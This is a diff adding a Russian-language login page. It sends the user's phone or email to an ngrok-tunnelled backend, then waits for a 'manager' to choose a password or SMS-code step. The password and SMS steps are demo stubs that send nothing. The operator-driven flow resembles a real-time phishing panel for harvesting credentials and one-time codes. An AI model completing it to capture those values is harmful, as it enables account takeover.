@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>🔐 Авторизация</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 20px 50px rgba(0,0,0,.3);
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 15px;
+            font-size: 16px;
+            border-radius: 8px;
+            border: 2px solid #ddd;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            font-weight: bold;
+            margin-top: 10px;
+            transition: transform 0.2s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+        }
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .error {
+            color: #ff3860;
+            text-align: center;
+            margin-top: 10px;
+            padding: 10px;
+            background: #ffeef2;
+            border-radius: 6px;
+            display: none;
+        }
+        .success {
+            color: #23d160;
+            text-align: center;
+            margin-top: 10px;
+            padding: 10px;
+            background: #effff4;
+            border-radius: 6px;
+            display: none;
+        }
+        .loader {
+            text-align: center;
+            padding: 20px 0;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #eee;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            margin: 20px auto;
+            animation: spin 1s linear infinite;
+        }
+        .login-info {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .login-info span {
+            font-weight: bold;
+            color: #667eea;
+        }
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+        .hidden {
+            display: none !important;
+        }
+        .back-btn {
+            background: #f8f9fa;
+            color: #333;
+            margin-top: 15px;
+        }
+        .back-btn:hover {
+            background: #e9ecef;
+        }
+        .instructions {
+            color: #666;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- Шаг 1: Ввод логина -->
+    <div id="step-1">
+        <h2>🔐 Введите логин</h2>
+        <input id="login" placeholder="+7 999 123-45-67 или email@example.com" autocomplete="off">
+        <button onclick="sendLogin()">Продолжить</button>
+        <div id="error-1" class="error"></div>
+        <div class="instructions">
+            Менеджер проверит ваш запрос в панели управления
+        </div>
+    </div>
+
+    <!-- Шаг 2: Ожидание -->
+    <div id="step-2" class="hidden">
+        <h2>⏳ Ожидание подтверждения</h2>
+        <div class="login-info">
+            Ваш логин: <span id="current-login"></span>
+        </div>
+        <div class="loader">
+            <div class="spinner"></div>
+            <p>Запрос отправлен менеджеру</p>
+            <p style="color: #666; font-size: 14px;">
+                Ожидайте выбора метода подтверждения...
+            </p>
+            <p id="wait-time" style="color: #999; font-size: 13px; margin-top: 10px;">
+                Ожидание: 0 сек
+            </p>
+        </div>
+        <div id="error-2" class="error"></div>
+        <button class="back-btn" onclick="reset()">Назад</button>
+    </div>
+
+    <!-- Шаг 3: Пароль -->
+    <div id="step-3" class="hidden">
+        <h2>🔑 Введите пароль</h2>
+        <div class="login-info">
+            Логин: <span id="login-password"></span>
+        </div>
+        <input type="password" id="password-input" placeholder="Пароль" autocomplete="off">
+        <button onclick="submitPassword()">Войти</button>
+        <div id="error-3" class="error"></div>
+        <button class="back-btn" onclick="reset()">Назад</button>
+    </div>
+
+    <!-- Шаг 4: SMS -->
+    <div id="step-4" class="hidden">
+        <h2>📱 Введите SMS-код</h2>
+        <div class="login-info">
+            Логин: <span id="login-sms"></span>
+        </div>
+        <input id="sms-input" placeholder="6-значный код из SMS" maxlength="6" autocomplete="off">
+        <button onclick="submitSMS()">Подтвердить</button>
+        <div id="error-4" class="error"></div>
+        <button class="back-btn" onclick="reset()">Назад</button>
+    </div>
+
+    <!-- Шаг 5: Успех -->
+    <div id="step-5" class="hidden">
+        <h2 style="color: #23d160;">✅ Успешный вход!</h2>
+        <div class="success" style="display: block;">
+            Вы успешно авторизовались в системе.
+        </div>
+        <p style="text-align: center; margin-top: 20px; color: #666;">
+            Перенаправление в личный кабинет...
+        </p>
+    </div>
+
+</div>
+
+<script>
+    // Адрес сервера
+    const SERVER_URL = window.location.origin.includes('github.io') 
+        ? "https://твой-ngrok-адрес.ngrok-free.dev"  // Если на GitHub Pages
+        : "http://localhost:5000";                   // Если локально
+    
+    let currentLogin = "";
+    let pollTimer = null;
+    let waitSeconds = 0;
+    let waitTimer = null;
+
+    // Показать шаг
+    function showStep(step) {
+        for (let i = 1; i <= 5; i++) {
+            document.getElementById(`step-${i}`).classList.add('hidden');
+        }
+        document.getElementById(`step-${step}`).classList.remove('hidden');
+        hideAllErrors();
+        
+        // Сбрасываем таймер ожидания
+        if (step === 2) {
+            startWaitTimer();
+        } else {
+            stopWaitTimer();
+        }
+    }
+
+    // Таймер ожидания
+    function startWaitTimer() {
+        waitSeconds = 0;
+        document.getElementById('wait-time').textContent = 'Ожидание: 0 сек';
+        
+        waitTimer = setInterval(() => {
+            waitSeconds++;
+            const minutes = Math.floor(waitSeconds / 60);
+            const seconds = waitSeconds % 60;
+            document.getElementById('wait-time').textContent = 
+                `Ожидание: ${minutes > 0 ? minutes + ' мин ' : ''}${seconds} сек`;
+        }, 1000);
+    }
+    
+    function stopWaitTimer() {
+        if (waitTimer) {
+            clearInterval(waitTimer);
+            waitTimer = null;
+        }
+    }
+
+    // Скрыть все ошибки
+    function hideAllErrors() {
+        for (let i = 1; i <= 4; i++) {
+            const errorEl = document.getElementById(`error-${i}`);
+            if (errorEl) {
+                errorEl.style.display = 'none';
+                errorEl.textContent = '';
+            }
+        }
+    }
+
+    // Показать ошибку
+    function showError(step, message) {
+        const errorEl = document.getElementById(`error-${step}`);
+        if (errorEl) {
+            errorEl.textContent = message;
+            errorEl.style.display = 'block';
+        }
+    }
+
+    // Отправить логин
+    async function sendLogin() {
+        const loginInput = document.getElementById('login');
+        const login = loginInput.value.trim();
+        
+        if (!login) {
+            showError(1, 'Пожалуйста, введите логин');
+            return;
+        }
+        
+        // Простая валидация
+        if (!(login.includes('@') || login.replace(/\D/g, '').length >= 10)) {
+            showError(1, 'Введите телефон (+79998885522) или email');
+            return;
+        }
+        
+        currentLogin = login;
+        hideAllErrors();
+        
+        // Блокируем кнопку
+        const btn = document.querySelector('#step-1 button');
+        const originalText = btn.textContent;
+        btn.textContent = 'Отправка...';
+        btn.disabled = true;
+        
+        try {
+            const response = await fetch(`${SERVER_URL}/send-login`, {
+                method: "POST",
+                headers: { 
+                    "Content-Type": "application/json",
+                    "Accept": "application/json"
+                },
+                body: JSON.stringify({ login: login })
+            });
+            
+            const data = await response.json();
+            
+            if (!response.ok) {
+                throw new Error(data.error || 'Ошибка сервера');
+            }
+            
+            if (data.success === false) {
+                throw new Error(data.error || 'Ошибка отправки');
+            }
+            
+            document.getElementById('current-login').textContent = login;
+            showStep(2);
+            startPolling();
+            
+        } catch (error) {
+            console.error('Ошибка отправки логина:', error);
+            showError(1, error.message || 'Ошибка соединения с сервером');
+        } finally {
+            btn.textContent = originalText;
+            btn.disabled = false;
+        }
+    }
+
+    // Начать опрос статуса
+    function startPolling() {
+        if (pollTimer) clearInterval(pollTimer);
+        
+        pollTimer = setInterval(async () => {
+            try {
+                // Кодируем логин для URL (на случай email с @)
+                const encodedLogin = encodeURIComponent(currentLogin);
+                const response = await fetch(`${SERVER_URL}/check-method/${encodedLogin}`);
+                const data = await response.json();
+                
+                if (data.success === true && data.method) {
+                    clearInterval(pollTimer);
+                    stopWaitTimer();
+                    
+                    if (data.method === "password") {
+                        document.getElementById('login-password').textContent = currentLogin;
+                        showStep(3);
+                        document.getElementById('password-input').focus();
+                    } else if (data.method === "sms") {
+                        document.getElementById('login-sms').textContent = currentLogin;
+                        showStep(4);
+                        document.getElementById('sms-input').focus();
+                    }
+                } else if (data.error === "Запрос отклонен") {
+                    clearInterval(pollTimer);
+                    stopWaitTimer();
+                    showError(2, 'Ваш запрос был отклонен администратором');
+                }
+                
+            } catch (error) {
+                console.error('Ошибка опроса:', error);
+            }
+        }, 2000); // Проверка каждые 2 секунды
+    }
+
+    // Отправить пароль
+    function submitPassword() {
+        const password = document.getElementById('password-input').value;
+        
+        if (!password) {
+            showError(3, 'Введите пароль');
+            return;
+        }
+        
+        // Демо: всегда неверный пароль
+        showError(3, 'Неверный пароль. Попробуйте еще раз.');
+        document.getElementById('password-input').value = '';
+        document.getElementById('password-input').focus();
+    }
+
+    // Отправить SMS
+    function submitSMS() {
+        const smsCode = document.getElementById('sms-input').value;
+        
+        if (!smsCode || smsCode.length !== 6) {
+            showError(4, 'Введите 6-значный код из SMS');
+            return;
+        }
+        
+        // Демо: всегда неверный код
+        showError(4, 'Неверный код. Проверьте SMS и попробуйте снова.');
+        document.getElementById('sms-input').value = '';
+        document.getElementById('sms-input').focus();
+    }
+
+    // Сброс
+    function reset() {
+        if (pollTimer) clearInterval(pollTimer);
+        stopWaitTimer();
+        currentLogin = "";
+        document.getElementById('login').value = '';
+        document.getElementById('password-input').value = '';
+        document.getElementById('sms-input').value = '';
+        hideAllErrors();
+        showStep(1);
+        document.getElementById('login').focus();
+    }
+
+    // Инициализация
+    document.addEventListener('DOMContentLoaded', function() {
+        // Фокус на поле ввода
+        document.getElementById('login').focus();
+        
+        // Поддержка Enter на шаге 1
+        document.getElementById('login').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') sendLogin();
+        });
+        
+        // Поддержка Enter на шаге 3
+        document.getElementById('password-input').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') submitPassword();
+        });
+        
+        // Поддержка Enter на шаге 4
+        document.getElementById('sms-input').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') submitSMS();
+        });
+    });
+</script>
+
+</body>
+</html>
